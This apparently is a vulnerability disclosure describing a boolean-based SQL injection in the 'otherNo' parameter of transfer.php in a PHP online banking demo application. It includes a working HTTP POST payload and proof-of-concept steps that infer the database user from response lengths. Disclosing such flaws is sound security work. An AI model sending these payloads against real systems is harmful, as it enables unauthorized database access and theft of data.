# Online Bank Management System - transfer.php 'otherNo' Unauthorized SQL inject

#### Exploit Title: Online Bank Management System - transfer.php 'otherNo' Unauthorized SQL inject

#### Vendor Homepage: https://www.sourcecodester.com/php/15373/online-banking-management-system-php-free-source-code.html

#### Software Link:https://www.sourcecodester.com/download-code?nid=15373&title=Online+Bank+Management+System+in+PHP+Free+Source+Code

#### Version: Online Bank Management System 1.0

#### Tested on: phpstudy 2018

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Online Bank Management System does not filter the content correctly at the " transfer.php 'otherNo'" parameter, resulting in the generation of SQL injection.

#### Analysis
transfer.php does not filter the incoming data, causing malicious SQL commands to be directly passed into, and eventually lead to SQL injection

<img width="1050" height="232" alt="image" src="https://github.com/user-attachments/assets/c52101fc-4f5c-4b7a-a782-c3eee178f9da" />


#### Payload used:

```
POST /SourceCodesterBank/transfer.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

otherNo=' or mid(user(),1,1)='r' -- &get=Get%2BAccount%2BInfo
```

#### Proof of Concept

First, we use boolean injection to test whether the first bit of user() is r

By returning the length of the package, you can compare it to the true and suitable return length is 4791.

<img width="933" height="284" alt="image" src="https://github.com/user-attachments/assets/1a64f2a5-9b20-4d18-a0dd-6cd600456520" />

<img width="1241" height="722" alt="image" src="https://github.com/user-attachments/assets/cd793e5a-90d1-48c8-a9be-3adf788bcf21" />

Verify again to determine whether the first four digits of user() are root, and the result is also verified that it is root

<img width="929" height="278" alt="image" src="https://github.com/user-attachments/assets/d9e78472-464f-4adc-9471-203fb6b110e5" />
